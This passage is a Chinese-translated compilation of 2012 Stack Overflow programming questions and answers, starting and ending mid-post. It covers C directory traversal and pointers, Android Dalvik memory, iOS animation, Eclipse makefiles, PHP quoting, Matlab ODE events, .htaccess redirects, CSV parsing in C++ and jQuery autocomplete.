closedir(dirp); 
```

cur_spot 持有'..'。

我在一个循环中执行此操作，它不断将目录爬升到根目录，我的输出顺序是：

```
.
.bash_logout
.
.
srv 
```

我知道它正在正确遍历，因为我正在检查沿途的 inode。

我需要使用不同于 d_name 的东西吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:56:32.430

我根据 sjs 回答下评论中的想法提出了这个问题：

```
#include <dirent.h>
#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <sys/stat.h>
#include <limits.h>
#include <errno.h>

int LookupName(const char* parent, ino_t ino, char *name, size_t size)
{
  DIR *dp = opendir(parent);
  if (!dp) return -1;

  int ret = -1;
  struct dirent *de;
  while (de = readdir(dp))
  {
    if (de->d_ino == ino)
    {
      strncpy(name, de->d_name, size);
      ret = 0;
      break;
    }
  }

  closedir(dp);
  if (ret == -1) errno = ENOENT;
  return ret;
}

int GetWorkdir(char *workdir, size_t size)
{
  struct stat st;
  if (stat(".", &st)) return -1;

  char path[PATH_MAX];
  strncpy(path, "..", sizeof(path));

  memset(workdir, '\0', sizeof(workdir));

  char name[PATH_MAX];
  while (1)
  {
    if (LookupName(path, st.st_ino, name, sizeof(name))) return -1;
    if (!strcmp(name, "..") || !strcmp(name, "."))
    {
      strncpy(name, "/", sizeof(name));
      strncat(name, workdir, sizeof(name));
      strncpy(workdir, name, size);
      break;
    }

    if (workdir[0] != '\0')
    {
      strncat(name, "/", sizeof(name));
    }

    strncat(name, workdir, sizeof(name));
    strncpy(workdir, name, size);

    if (stat(path, &st)) return -1;

    strncat(path, "/..", sizeof(path));
  }

  return 0;
}

int main(int argc, char **argv)
{
  char workDir[PATH_MAX];

  assert(!GetWorkdir(workDir, sizeof(workDir)));
  printf("%s\n", workDir);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:17:34.197

`readdir`正在读取目录，所以当你说

```
printf("parent name: %s\n", readdir(dirp)->d_name); 
```

您实际上是要求`..`为您打印内部第一个条目的名称，而不是`..`目录的名称。

根据您要执行的操作，也许解析的输出`getcwd`可能是更好的方法？

# android - Dalvik 虚拟机占用的大小

> ID：13756619
> 
> 赞同：3
> 
> 时间：2012-12-07T03:50:41.630
> 
> 标签：android, virtual-machine, dalvik, android-framework

我试图了解为 Android 中的每个进程分配了多少内存。据我了解，对于每个应用程序进程都有一个单独的 Zygote 进程实例，Zygote 将分叉 Dalvik VM。

我写了一个小的示例 java 应用程序，它只是在一个循环中打印“hello world”。后来通过 ADB shell 调用了 Dalvik VM。现在，Procrank 命令显示，

PID Vss Rss Pss Uss cmdline 9374 7556K 7556K 3600K 3384K dalvikvm

此处显示的 USS 是 3384k。

后来，我写了一个带有一个activity和TextView的小android程序。现在 procrank 节目

PID Vss Rss Pss Uss cmdline 6540 37256K 35124K 4387K 3392K com.example.helloworld

我的问题是：

1.  如果每个app进程都包含Dalvik VM，会不会占用更多内存？
2.  我们怎么知道VM占用的内存大小和Java进程占用的大小？

关于 Dalvik 以及它是如何被调用的以及每个进程中 VM 占用的内存，我的理解可能是错误的。

欢迎任何见解。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-21T10:38:36.860

好的，我等了很长时间，期待专家回答这个问题。让我分享一下我所知道的。

回答第一个问题：“如果每个应用进程都包含 Dalvik VM，它不会占用更多内存吗？”

Dalvik 堆由 zygote 预加载了类和数据（从 Android 版本 2.2 开始加载了 1900 多个类）。当 zygote fork 启动一个 android 应用程序时，新应用程序会获得这个堆的写时复制映射。正如 Dan Borstein 在下面所说，这有助于减少内存以及缩短应用程序启动时间。

`It's used in Android to amortize the RAM footprint of the large amount of effectively-read-only data (technically` `writable but rarely actually written) associated with common library classes across all active VM processes. 1000+` `classes get preloaded by the system at boot time, and each class consumes at least a little heap for itself, including` `often pointing off to a constellation of other objects. The heap created by the preloading process gets` `shared copy-on-write with each spawned VM process (but again doesn't in practice get written much). This saves` `hundreds of kB of dirty unpageable RAM per process and also helps speed up process startup.`

对于您的 2 个问题：“我们怎么知道 VM 占用的内存大小和 Java 进程占用的大小？”

我不明白您所说的“Java 进程占用的大小” [检查](https://stackoverflow.com/questions/2298208/how-to-discover-memory-usage-of-my-application-in-android/2299813#2299813)链接是什么意思，以便清楚了解 dalvik 中的内存。

除了 procrank，我们还可以使用`adb shell dumpsys meminfo 'your apps package name'` 检查此[链接](https://stackoverflow.com/questions/11201659/android-adb-shell-dumpsys-tool) 获取有关 dumpsys 的更多信息。

# iphone - 无法从超级视图中删除图像

> ID：13756623
> 
> 赞同：0
> 
> 时间：2012-12-07T03:51:19.693
> 
> 标签：iphone, objective-c, ios

我创建了一个动画，完成后应该删除正在动画的图像。出于某种原因，它没有工作（即它没有删除图像）。有什么我做错了吗？：

```
[UIView animateWithDuration:1.8 delay:0 options:UIViewAnimationOptionCurveEaseInOut
                 animations:^{
                     appleView[i].frame = CGRectMake(applePosition, 400.0, 25.0, 25.0);
                 }
                 completion:^(BOOL finished){ [appleView[i] removeFromSuperview]; }]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:57:05.500

可能的原因是`appleView[i]`nil。在完成块中放置一个断点并检查它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T06:18:16.847

appleView 是局部变量还是类成员？还有什么会改变appleView吗？

完成块将在您启动动画后大约 1.8 秒运行，如果 appleView 是类成员并且发生了某些更改，您可能会删除错误的内容。尝试在局部变量中捕获 appleView[i]，如下所示：

```
UIView *goingAway = appleView[i];
[UIView animateWithDuration:1.8 delay:0 options:UIViewAnimationOptionCurveEaseInOut
       animations:^{
           goingAway.frame = CGRectMake(applePosition, 400.0, 25.0, 25.0);
        } completion:^(BOOL finished){
           [goingAway removeFromSuperview];
        }]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:54:10.327

试试这个代码..

```
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:1.8];
[UIView setAnimationTransition: UIViewAnimationOptionCurveEaseInOut forView:self.view cache:YES];
[appleView[i] removeFromSuperview];
[UIView commitAnimations]; 
```

我希望这可以帮助你...

# javascript - 如何用jQuery或js实现3D曲线墙

> ID：13756624
> 
> 赞同：4
> 
> 时间：2012-12-07T03:51:25.900
> 
> 标签：javascript, android, jquery, html, assets

我想实现的效果只是你可以从下面的网站上看到：http: [//www.designasaurus.co.uk/page2/page9/page9.html](http://www.designasaurus.co.uk/page2/page9/page9.html)

我真的很想主要使用 jQuery/js 结合 html 和 css 来实现这个效果。我会将这些资源放在`assets`我的 Android 项目下，这样我就可以在我的 Android 设备上查看此效果。希望有人能给我一些提示或参考网站来实现它，或者你可以告诉我：嘿，伙计！你无法在你的 Android 项目中实现它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T06:08:02.447

编辑：Android 浏览器不走运。然而，在 WebGL 之前，我会研究 canvas Transform 方法：

[https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Transformations](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Transformations)

从“比例示例”开始

这些应该比 WebGL 更少前沿

/编辑

老实说，我在最新的 CSS3 方面有点落后，但听起来 CSS 转换符合要求。

我想android默认浏览器几乎是Chrome。看起来你可以在这里找到一些关于如何使用 CSS 的线索。请参阅最底部的示例。

[http://css3.bradshawenterprises.com/transforms/](http://css3.bradshawenterprises.com/transforms/)

不过，不确定使用背景图像会有多平滑。

要获得更完整的控制，您可能需要研究 webGL，它仍然非常先进，但不比最新的 CSS3 更先进，但 CSS3 可能就是您所需要的。

# eclipse - 自定义 makefile 在 cmd 中与 Cygwin make 一起工作，但在 Eclipse CDT 中不起作用

> ID：13756626
> 
> 赞同：2
> 
> 时间：2012-12-07T03:51:52.433
> 
> 标签：eclipse, makefile, cygwin, eclipse-cdt

我有一个简单的 makefile 在 CMD 提示下使用 Cygwin make 可以正常工作。但是通过 Eclipse CDT 中的 Make Target 调用会出现问题。

我的makefile的内容如下：

```
all: aaa

aaa: bbb.o
    cc -o aaa.exe bbb.o

bbb.o: bbb.c
    cc -c bbb.c

clean:
    rm -f *.exe *.o 
```

在 CMD 中，`make all`将构建并生成 aaa.exe，同时`make clean`将清理生成的 EXE 文件。

使用的 make 命令来自`{myCygwinFolder}\bin\make.exe`. 这可以`which make`在 CMD 中检查，它给出`/usr/bin/make`. 此外，Cygwin 路径已添加到我的系统 PATH 中。

但是当我尝试建立一个标准的 Make C 项目时，`make clean`它就不起作用了。实际上，我已经为我的项目设置了 2 个 Make Targets，`make all`并且`make clean`. 发生的事情是，无论我跑哪一个，我总是得到以下错误：

```
Error launching builder (make all )
(Exec error:The system cannot find the file specified.
) 
```

或者

```
Error launching builder (make clean)
(Exec error:The system cannot find the file specified.
) 
```

在网上搜索和一些尝试后，我发现 Eclipse 似乎无法正确找到构建器/制作。

因此，我转到项目属性、Builders 选项卡并创建了一个指向我的`{myCygwinFolder}\bin\make.exe`.

通过此修复，我将能够使用 Make Target 进行编译`make all`。但是当我使用 Make Target 编译时`make clean`，Eclipse 仍然尝试运行 Make Target `make all`。

如果我将干净的部分移动到 makefile 的开头。两个 Make Target 都将运行`make clean`。似乎 all/clean 标签没有正确传递到 Cygwin make 中，而 Eclipse 只是在 makefile 中完成了第一个任务。

Eclipse中的项目结构设置为：

```
ProjectRoot
  |__folderA
       |__makefile
       |__bbb.c
       |__*.*
  |__folderB 
```

任何人都可以帮助在 Eclipse 中设置正确的 Make Target 吗？欢迎任何意见。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-10T20:40:19.267

问题是路径。当您从 Eclipse 进入 windows 环境时，您需要调整路径以确保可以找到 make。在我使用 CDT 的日子里，我经常不得不更改默认的构建命令来解决这个问题

# html - 在 Web 浏览器中播放分段的 MP4 文件

> ID：13756633
> 
> 赞同：4
> 
> 时间：2012-12-07T03:52:55.277
> 
> 标签：html, ffmpeg, html5-video

我想建立一个 MP4 流媒体服务器。
我用 ffmpeg 生成了 MP4 文件，如下所示。

```
$ffmpeg -i input.avi -movflags frag_keyframe output.mp4 
```

它在谷歌浏览器中正常运行，但 IE9 和 Safari 只能播放一小段时间。
（一个关键帧持续时间）
程序是什么？

谢谢

HTML 代码在这里：

```
<body>
  <video id="myvideo" controls="controls">
    <source src="output.mp4" type="video/mp4"/>
       The browser does not support HTML5
  </video>
</body>
</html> 
```

# c - *, &, ... 使用以下代码块解释指针、变量和地址的关系和命名：

> ID：13756635
> 
> 赞同：-3
> 
> 时间：2012-12-07T03:53:13.020
> 
> 标签：c, pointers

我最近在回顾一篇关于指针的优秀、高度赞扬的文章：[理解指针的障碍是什么，可以做些什么来克服它们？](https://stackoverflow.com/questions/5727/what-are-the-barriers-to-understanding-pointers-and-what-can-be-done-to-overcome) 当我阅读它时，我开始理解指针是什么。不幸的是，我仍然无法使用它们。

原因如下：我不懂命名！或者是指针的应用。在阅读了几本'so-you-want-to-learn-c'的书籍和文章后，我一次又一次地遇到了类似的代码：“如何创建和实例化指针”。

*回答时，请使用示例代码来演示在实践中指针输出的内容。*

这是代码：

```
char ch = 'c'; 
char *chptr = &ch; 
```

或者，也许更令人困惑：

```
char ch = 'c';
char *chptr;
chptr = &ch; 
```

请注意，`chptr`它的命名与其他两个变量不同，它们名为`ch`。为什么不命名所有三个变量`ch`？给指针起一个不同的名字能解决什么问题？

此外，在我们的第一段代码中`...*chptr = &ch;`；在第二个，`chptr = &ch;`。是什么使得在第二个块中删除星号是可以接受的？

接下来，我想知道指针的应用是什么。我是否总是需要一个指针（什么时候需要，什么时候不需要）？提交答案后，我感到自信——相信我将能够理解使用指针的更复杂的代码——足以继续直观地适应语言。不过，我仍然充满好奇。

以这段代码为例：

```
typdef struct person
{
  char *name;
  int age;
} 
```

为什么将 name 声明为指向不存在的 name 变量的指针，为什么将 age 变量声明为 int 而不使用指针？由于这个块，这没有意义：

```
int main()
{
/* below, the int is a pointer */
  int *p;
  void *up;
  return 0;
} 
```

或者这个块：

```
char *sp;
sp = "Hello";
printf("%s",sp); 
```

我认为指针指向一个地址。“你好”不是地址。

考虑到前面的两个块，看看最后一个块：

```
int main()
{
  int i,j;
  int *p;
  i = 5;
  p = &i;
  j = *p; //j = i?
  &p = 7; //i = 7?
} 
```

不应该将 j 设置为 &i 因为`*p = &i`not `i`。并且不应该`&p = 7`将p的地址设置为7，这可能不是i？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T06:31:40.660

> 请注意，chptr 的名称不同——此时我添加了一个答案——来自其他两个变量，它们被命名为 ch。为什么不命名所有三个变量 ch？

*   通常的做法是指针以“p”为前缀（或在这种情况下以“ptr”为后缀），以便代码阅读器清楚该变量是一个指针。正如您现在所知，使用指针编程最初很困难，虽然`int *i = 1;`和`int i = 1`都是合法的，但无意中用一个代替另一个可能会导致一些严重的调试时间。

> 此外，在第一个代码块中，我们有 ...*chptr = &ch;; 在第二个中，chptr = &ch;。是什么使得在第二个块中删除星号是可以接受的？

*   这是使用“*”声明指针变量的语法，例如：`int *pInt;`
*   为指针变量赋值（使其指向某个东西），你不需要'*'。前任：

    ```
     int *pInt;
        pInt = &someInt; 
    ```

*   但是，要将值分配给指针变量指向的地址或获取变量指向的值，您必须使用 '*' 取消引用它

    ```
     int *pInt;
        int someInt = 100;
        pInt = &someInt;
        *pInt = 50;
        printf("%d - %d", *pInt, someInt); // prints "50 - 50" 
    ```

> 接下来，我想知道指针的应用是什么。

*   指针用于，除其他外：

    1.  将值传递给函数
    2.  动态内存分配...

> 为什么将 声明`name`为指向不存在的名称变量的指针，以及为什么将`age`变量声明为 int 而不使用指针？

*   “你好”是一个 5 个字符的数组。使用`sp = "Hello"`, "Hello" 被存储在一个内存位置，它的地址被分配给`sp`.
*   从您的示例中，我假设名称可能包含任意数量的字符，因此在程序执行期间，将使用动态分配来存储名称。

> 我认为指针指向一个地址。“你好”不是地址。

*   “Hello”（C 中的字符串）被视为字符数组。在这种情况下，sp 指向一个包含 5 个字符的数组的内存位置（堆或堆栈），当您在赋值中使用它时，它将返回“Hello”字符串在内存中的地址。

    ```
    int main()
    {
      int i,j;
      int *p;
      i = 5;
      p = &i;
      j = *p; //j = i?
      &p = 7; //i = 7?
    } 
    ```

    *   `j`不是`i`，从某种意义上说，改变`j=100`不会影响`i`(`i`仍然具有价值`5`) 的价值。

    *   `&p = 7`可能不是您想要的。它可能会导致错误，因为`&p`会产生一个值，并且将值分配给一个值是非法的（例如：它将评估为这样的东西`0x0108 = 7;`：）

    *   考虑上述变量的以下内存示例

        ```
         address | var    | value
         0x0100  | i      | undefined
         0x0104  | j      | undefined
         0x0108  | p      | undefined 
        ```

    *   后`j = *p,`

        ```
         0x0100 | i      | 5
         0x0104 | j      | 5
         0x0108 | p      | 0x0100 
        ```

之后`*p=7`（修正自`&p = 7;`）

```
 0x0100 | i      | 7
         0x0104 | j      | 5
         0x0108 | p      | 0x0100 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:46:28.790

```
Example code:

#include <stdio.h>
#include <stdlib.h>

int main()
{
    int i;
    long j;
    int *p;

    i = 5;
    p = &i;  ---> Assigning address of "i" to p, so that pointer p points to "i"
                  By dereferencing pointer "p" i.e. by *p, shall retrieve value "5". 

    j = *p; or j = i (alternative to assign value "5" to "j")

    printf("Value of j:%d \n", j); --> Output is "5".

    &p = 7; //i = 7? --> will not change the value of "i" to 7, but instead  
                         will try to change the address of "p", which cannot be 
                         modified.                              

    j = (long)&i;  ---> Assigns address of "i" i.e "100" to "j". 

    printf("Value of j:%p \n", j); --> Output is address of "i" i.e. "100"

    printf("Value of i:%d \n", i); --> Output is "5". Value assigned to "i".

    printf("Address of i:%p \n", &i); --> Output is "100" i.e. address of "i" in our
                                          case.

    printf("Value of *p:%d \n", *p); --> Output is "5". Since pointer p is pointing 
                                        to "i" i.e. "100" in our case. 
                                        *p -> by dereferencing, retrieves value 
                                        present at the address "100" 
                                        that would be "5".

    printf("Value of p:%p \n", p); --> Output is "100". Pointer p is pointing 
                                       to "i" i.e. "p = &i" it will be "100" in our 
                                       case.   

    printf("Address of p:%p \n", &p); --> Output would be the address of pointer "p".
                                          It will not be same as the address of "&i" 
                                          or value present in "p".

    return 0;       
} 
```

# php - php 和 javascript 的引号包含在 php 函数中

> ID：13756638
> 
> 赞同：0
> 
> 时间：2012-12-07T03:53:17.380
> 
> 标签：php, jquery

使用 jquery 我这样做：

```
$(function() {
$('#iButton').change(function() {
    $.ajax({
       url: 'index.php?option=com_cameras&task=globalmotiondetection&id_hash=<?php echo $id_hash; ?>&global_monitoring='+ (this.checked ? 1 : 0) + '&format=raw'

    });
});
}); 
```

这很好用。但现在我将它放入一个 php 函数（Joomla 编码）但无法找出引号：

```
$doc->addScriptDeclaration('
$(function() {
$("#iButton").change(function() {
    $.ajax({
       url: "index.php?option=com_cameras&task=globalmotiondetection&id_hash='$id_hash'&global_monitoring="+ (this.checked ? 1 : 0) + "&format=raw"
    });
});

});
'); 
```

这给了我：解析错误：语法错误，url 行上的意外 T_VARIABLE。不知道引号应该是什么样子。我想我也不能放在`$id_hash`那里（我猜是因为错误）。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:00:55.537

为了使其更简单，请使用 Heredoc。见[http://php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc](http://php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc)

```
$str = <<<EOT
$(function() {
    $("#iButton").change(function() {
        $.ajax({
           url: "index.php?option=com_cameras&task=globalmotiondetection&id_hash='$id_hash'&global_monitoring="+ (this.checked ? 1 : 0) + "&format=raw"
        });
    });
});

EOT; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:55:57.307

要将变量连接成单引号字符串，可以使用连接运算符`.`：

```
$doc->addScriptDeclaration('
$(function() {
$("#iButton").change(function() {
    $.ajax({
       url: "index.php?option=com_cameras&task=globalmotiondetection&id_hash=' . $id_hash . '&global_monitoring="+ (this.checked ? 1 : 0) + "&format=raw"
    });
});

});
'); 
```

或者，您可以改用双引号字符串，这样您就可以在内部插入变量：

```
$doc->addScriptDeclaration("
$(function() {
$('#iButton').change(function() {
    $.ajax({
       url: 'index.php?option=com_cameras&task=globalmotiondetection&id_hash=$id_hash&global_monitoring='+ (this.checked ? 1 : 0) + '&format=raw'
    });
});

});
"); 
```

# matlab - 在 Matlab 中使用 ode45 进行弹丸运动

> ID：13756641
> 
> 赞同：2
> 
> 时间：2012-12-07T03:53:33.130
> 
> 标签：matlab, ode, projectile

我正在尝试在 Matlab 中使用阻力对弹丸运动进行建模。一切都很完美......除了我不知道如何让它在“子弹”击中地面时停止。

我最初尝试了一个迭代循环，定义一个数据数组，并在 y 值为负时清空该数组的单元格......不幸的是，ode 求解器不太喜欢这样。

这是我的代码

```
 function [ time , x_position , y_position ] = shell_flight_simulator(m,D,Ve,Cd,ElAng)

rho=1.2; % kg/m^3
g=9.84; % acceleration due to gravity
A = pi.*(D./2).^2; % m^2, shells cross-sectional area (area of circle)

    function [lookfor,stop,direction] = linevent(t,y);
        % stop projectile when it hits the ground
        lookfor = y(1); %Sets this to 0
        stop = 1; %Stop when event is located
        direction = -1; %Specify downward direction

        options = odeset('Events',@event_function); % allows me to stop integration at an event
        function fvec = projectile_forces(x,y)
            vx=y(2);
            vy=y(4);
            v=sqrt(vx^2+vy^2);

            Fd=1/2 * rho * v^2 * Cd * A;

            fvec(1) = y(2);
            fvec(2) = -Fd*vx/v/m;
            fvec(3) = y(4);
            fvec(4) = -g -Fd*vy/v/m;
            fvec=fvec.';
        end

        tspan=[0, 90]; % time interval of interest

        y0(1)=0;   % initial x position
        y0(2)=Ve*cos(ElAng); % vx
        y0(3)=0;   % initial y position
        y0(4)=Ve*sin(ElAng); % vy

        % using matlab solver
        [t,ysol] = ode45(@projectile_forces, tspan, y0);
    end
end
x =  ysol(:,1);
vx = ysol(:,2);
y =  ysol(:,3);
vy = ysol(:,4);

plot(x,y, 'r-');
xlabel('X Position (m)');
ylabel('Y Position (m)');
title ('Position Over Time');

end 
```

我认为这会在 y=0 时定义一个事件并停止射弹，但它什么也没做。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:57:16.787

当试图找到 ODE 的解决方案达到某个级别的时间时，您应该使用事件函数 - 请参阅[BALLODE](http://www.mathworks.com/help/matlab/math/ordinary-differential-equations.html#f1-669698)演示以获取当解决方案的组件之一达到 0 时停止解决方案过程的示例。

# java - 在 Java 1.4 中使用 Apache httpclient 读取 URL 内容

> ID：13756644
> 
> 赞同：0
> 
> 时间：2012-12-07T03:54:13.817
> 
> 标签：java, timeout, httpconnection

在 Java 1.4 中，我正在尝试连接到 URL，但由于我想配置超时，所以我使用 Apache 的 httpclient 而不是老式的 URLConnection.openConnection();

所以我有以下内容：

```
 HttpConnection conn = null;
    SimpleHttpConnectionManager httpMgr = new SimpleHttpConnectionManager(true);
    HostConfiguration hostConf = new HostConfiguration();
    hostConf.setHost(new HttpHost("http://www.google.com"));
    conn = httpMgr.getConnectionWithTimeout(hostConf, 30);
    conn.open(); 
```

但似乎每次我尝试打开连接时，我都会得到一个 java.net.UnknownHostException: [http://www.google.com](http://www.google.com)，甚至是 google.com。

我做错什么了吗..？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:19:14.423

我认为协议（http://）是破坏它的原因。尝试使用“www.google.com”作为主机名。HTTP 客户端教程在[这里](http://hc.apache.org/httpcomponents-client-ga/tutorial/html/index.html)。

# php - 如何在爆炸数组的返回值上使用 strcmp

> ID：13756645
> 
> 赞同：0
> 
> 时间：2012-12-07T03:54:15.557
> 
> 标签：php, arrays, explode, strcmp

我正在尝试将常用词从列表中剔除。我的常用词是用换行符分隔的大字符串。我通过用逗号替换新行将单个单词放入数组元素中，然后用逗号作为分隔符分解字符串。

```
common = preg_replace("/\n/", ",",$common);
$check = array();
$check = explode("," , $common); 
```

但是，当我尝试使用 strcmp 来检查一个单词时，或者通过使用数组翻转的键翻转值，然后使用 array_key_exists，即使我键入两个字符串看起来相同，我也什么也得不到。我相信这是因为在数组中字符串前面是单词字符串？不过不确定，我该如何解决这个问题？

# c++ - C++ 多维数组

> ID：13756649
> 
> 赞同：1
> 
> 时间：2012-12-07T03:54:36.307
> 
> 标签：c++, c, syntax, multidimensional-array, operators

我们有代码：

```
int arr[3][4]; 
```

也是这样`arr`：

1.  一个由 3 个元素组成的数组，每个元素都是一个 4 个 int 的数组。

2.  一个由 4 个元素组成的数组，每个元素都是一个 3 个 int 的数组。

哪一个是对的，为什么？它如何与更高维数组一起工作？我想这与运算符优先级和关联性有关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:59:55.317

你的第一个解释是正确的。

此类声明最好使用**Right Left 规则**进行解析，您可以[在此处](http://www.informit.com/articles/article.aspx?p=31783&seqNum=7)和[此处阅读](http://ieng9.ucsd.edu/~cs30x/rt_lt.rule.html)

C++ 标准草案中的 8.3.4 美元：...

> 示例：考虑 int x[3][5]; 这里 x 是一个 3 × 5 的整数数组。

...

> 注意：由此可知，C++ 中的数组是按**行**存储的 （最后一个下标变化最快），声明中的第一个下标有助于确定数组消耗的存储量，但在下标计算中没有其他作用。——尾注]

注意 C++ 没有运算符[][]。它只有 operator[]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:05:05.787

我发现最容易想到多维数组中的“行”和“列”，而不是试图让我的思想围绕“数组的数组”。这有一个方便的属性，*我*决定哪个索引是行，哪个是列。换句话说，我可以将其`int arr[3][4];`视为 3 行 4 列或 4 行 3 列的二维数组。只要我的代码与我对数组的心理看法一致，一切都会好起来的。但是，如果我在程序中途切换视图，事情就会开始崩溃。

话虽如此，通常我更喜欢将此示例视为 3 行和 4 列，因为这类似于线性代数中首先列出行的数学符号。

# .htaccess - 将文件夹重定向到根目录而不是子文件夹

> ID：13756650
> 
> 赞同：0
> 
> 时间：2012-12-07T03:54:42.343
> 
> 标签：.htaccess, redirect

如何重定向两个特定文件夹但保持子文件夹不变？

例如

刻字 > 重定向到根目录 (mysite.com)

*   subfolder1 > 保持不变
*   subfolder2 > 保持不变

类型 > 重定向到根目录 (mysite.com)

*   subfolder1 > 保持不变
*   subfolder2 > 保持不变

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:37:03.623

使用 mod_alias：

```
RedirectMatch ^/lettering/?$ /
RedirectMatch ^/type/?$ / 
```

使用 mod_rewrite：

```
RewriteEngine On
RewriteRule ^/?lettering/?$ / [L,R]
RewriteRule ^/?type/?$ / [L,R] 
```

这将重定向对`http://mysite.com/lettering/`to的请求`http://mysite.com/`，但*不会重定向*像`http://mysite.com/lettering/subfolder2/`.

# c++ - 在 C++ 中处理 CSV 文件

> ID：13756653
> 
> 赞同：0
> 
> 时间：2012-12-07T03:55:17.107
> 
> 标签：c++, c, visual-c++, software-design

我有一个要求，我需要从下面显示的 csv 文件中搜索产品条形码。

```
Sr. No.,Product Barcode,Product Description,Discount (%),Price Per Unit
1,011001,TOILET PAPER,5,40
2,011002,BATHING SOAP,0,27
3,011003,MOISTURIZER,3,95
4,011004,SHAMPOO,0,115
5,011005,CONDITIONER,5,155
6,011006,TISSUE,10,60
7,011007,HAIR OIL,0,75
8,011008,HAIR GEL,0,96
9,011009,BODY LOTION,7,195
10,011010,FACE WASH,0,85 
```

当用户输入条形码时，它应该搜索 csv 文件，并且应该选择单价以及折扣并生成账单。这必须在 C++ 中实现。在开发的后期我还需要更新csv文件内容。例如，如果它有一个“数量”列，显示特定产品的库存存在，并且当该产品售出时，我还需要更新 csv 字段数量。

请指导我如何搜索 csv 文件并选择字段。我在网上搜索但找不到满意的答案。

我正在使用 Bloodshed Dev C++。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T10:04:28.543

I am able to extract the product price for entered barcode and generate the bill, using getline().

Cheers Guys for ur resposes.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-08T20:23:30.657

我建议使用`libpcre`

你可以这样做——

```
#include <iostream>
#include <vector>
#include <string>
#include <pcre++.h>

using namespace std;
using namespace pcrepp;

int main(int argc, char **argv) {
    string pat = ",";
    vector<string> v;
    string s;
    Pcre p(pat);
    int ctr;
    while( getline(cin, s) ) {
        v = p.split(s);
        vector<string>::iterator i;
        for(i=v.begin(),ctr=0;i!=v.end();i++,ctr++) {
            if(ctr==2) {
                 cout << *i << endl;
            }
        }
    }
    return 0;
} 
```

我同意这对于提取第二列或第 n 列可能有点过分，但我喜欢这种方法，因为 pcre 在您希望从 CSV 文件中提取的文本方面为您提供了很大的自由。

# html - Firefox 17.0.1 忽略字体粗细

> ID：13756655
> 
> 赞同：1
> 
> 时间：2012-12-07T03:55:32.613
> 
> 标签：html, css, firefox, html-table

[http://iamsinc.com/blog/new-producer-bonus/](http://iamsinc.com/blog/new-producer-bonus/)

出于某种原因，我的 Windows 7 机器上的 Firefox 17.0.1 忽略了 td 元素的字体粗细。应该是正常的。这适用于 Chrome、IE 7 8 和 9，但不适用于 FF。我还在运行 17.0.1 的 XP 机器上对其进行了测试，它运行良好。字体粗细应该是正常的，而不是粗体。在第二个框（$300k 级别）中，字体粗细在 Win 7 FF 17.0.1 上显示为粗体，将图片推到框外。

我什至尝试过降低字体重量，但它对有问题的 FF 浏览器没有影响

有人有解决方案甚至解决方法吗？我讨厌为了解决这个问题而将图片全部缩小。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:04:56.317

也许是您的浏览器缓存，尝试清理它。我有 Windows 7 和 Firefox 17.0.1，字体粗细正常。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:24:09.530

现在在你的 CSS 中添加这条规则

```
.npbbox td {
    font-weight: bold;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T05:02:49.067

**一个原因可能是**其他一些**规则使 font-weight:normal**

只需尝试使用带有 !important 的内联样式...如果它会起作用，则意味着其他一些规则具有高优先级...

检查萤火虫找到它

# jquery - jQuery-UI 自动完成功能不起作用

> ID：13756658
> 
> 赞同：2
> 
> 时间：2012-12-07T03:55:44.267
> 
> 标签：jquery, ajax, asp.net-mvc, jquery-ui

我需要在 .net MVC 程序中使用 jQuery-ui“自动完成”，但它不起作用。任何人都可以帮助我将不胜感激。

视图代码如下：

```
<head runat="server">
    <link href="../../Content/jquery-ui-1.8.14.custom.css" rel="stylesheet" type="text/css" />

    <script src="../../Scripts/jquery-1.6.2.min.js" type="text/javascript"></script>
    <script src="../../Scripts/jquery-ui-1.8.14.custom.min.js" type="text/javascript"></script>
</head>

<script type="text/ecmascript">
    $(document).ready(function () {
        $.ajax({
            type: "GET",
            url: "/Product/GetProductName/",
            dataType: "json",
            data: { categoryID: <%: Model.Select(o => o.Category.CategoryName).Distinct().Count() > 1 ? 0 : Model.FirstOrDefault().CategoryID %> },
            contentType: "application/json; charset=utf-8",
            success: function(data) {
                $('#productNameSearch').autocomplete({
                    minLength: 0,
                    source: Sys.Serialization.JavaScriptSerializer.deserialize(data),
                    focus: function(event, ui) {
                        $('#productNameSearch').val(ui.item.ProductName);
                        return false;
                    },
                    select: function(event, ui) {
                        $('#productNameSearch').val(ui.item.ProductName);
                        $('#selectedValue').text("Selected value:" + ui.item.ProductID);
                        return false;
                    }
                });
            },
            error: function (XMLHttpRequest, textStatus, errorThrown) {
                alert(textStatus);
            }
        });
    });
</script>

<% using (Html.BeginForm("ProductNameSearch", "Product", FormMethod.Post)) {%>
        <input type="text" id="productNameSearch" name="productNameSearch" style="width:300px" />&nbsp;
        <input type="submit" value="Go!" />
        <div id="selectedValue"></div>
